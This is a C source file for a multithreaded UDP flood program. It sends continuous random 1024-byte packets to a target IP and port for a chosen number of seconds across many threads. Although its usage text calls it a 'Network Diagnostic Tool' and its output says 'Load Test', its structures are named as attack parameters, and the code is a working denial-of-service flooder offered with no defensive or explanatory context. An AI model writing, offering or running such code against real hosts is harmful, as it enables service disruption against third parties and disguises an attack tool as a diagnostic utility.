#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PAYLOAD_SIZE 1024
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void gen_payload(char* buf, int size) {
    FILE *urandom = fopen("/dev/urandom", "r");
    if(fread(buf, 1, size, urandom) != size) {
        perror("Payload generation failed");
    }
    fclose(urandom);
}

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if (sock < 0) {
        perror("Socket creation error");
        pthread_exit(NULL);
    }

    gen_payload(payload, PAYLOAD_SIZE);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &server_addr.sin_addr);

    time_t start = time(NULL);
    while(time(NULL) - start < params->duration) {
        sendto(sock, payload, PAYLOAD_SIZE, 0,
              (struct sockaddr*)&server_addr, sizeof(server_addr));
    }
    
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if(argc != 5) {
        printf(YELLOW "Network Diagnostic Tool\n" RESET
               "Usage: %s <IP> <PORT> <SECONDS> <THREADS>\n", argv[0]);
        return 1;
    }

    AttackParams params;
    strncpy(params.ip, argv[1], 15);
    params.ip[15] = '\0';
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    printf(RED "\n🚀 Initializing Load Test\n" RESET
           "▸ Target: %s:%d\n"
           "▸ Duration: %d seconds\n"
           "▸ Workers: %d\n\n",
           params.ip, params.port, params.duration, thread_count);

    pthread_t threads[thread_count];
    for(int i = 0; i < thread_count; i++) {
        if(pthread_create(&threads[i], NULL, send_payload, &params)) {
            perror("Thread initialization error");
        }
    }

    for(int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf(GREEN "\n✅ Load Test Complete\n" RESET
           "▸ Target: %s:%d\n"
           "▸ Total Duration: %d seconds\n"
           "▸ Data Pattern: Cryptographic Random\n\n",
           params.ip, params.port, params.duration);

    return 0;
}